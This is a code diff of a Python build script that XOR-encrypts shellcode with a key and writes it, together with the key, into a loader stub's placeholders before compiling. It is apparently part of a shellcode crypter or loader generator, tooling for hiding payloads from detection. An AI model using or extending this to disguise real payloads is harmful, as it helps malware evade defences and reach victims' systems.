@@ -36,22 +36,27 @@ def main():
     print(f"Shellcode length: {nb_bytes} bytes")
     print("================================\n")
 
+    instructions = SHELLCODE_PREFIX+instructions
     # Encrypt the shellcode
     if ENCRYPTION_KEY != "":
         print("===========ENCRYPTION==============")
         print(instructions)
-        print("\nthen\n")
+        print(f"\nEncrypted with '{ENCRYPTION_KEY}'\n")
         encrypted_instructions = xor_encrypt_decrypt(instructions, ENCRYPTION_KEY)
         print(encrypted_instructions)
         print("===================================\n")
+        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
+        sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", ENCRYPTION_KEY)
+    else:
+        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
+        sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", "")
 
     # Need to decide if 909090 xor KEY is constant to unxor later, maybe no need to
-    instructions = SHELLCODE_PREFIX+instructions
+    
 
     # Replace the final shellcode in the loader
-    sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
-    sed_file(WORKING_FOLDER+STUB_FILE, "%KEY%", ENCRYPTION_KEY)
-    sed_file(WORKING_FOLDER+STUB_FILE, "%LENGTH%", str(int(len(SHELLCODE_PREFIX)/2)+nb_bytes))
+
+    
 
     print("\n================COMPILATION===============")
 
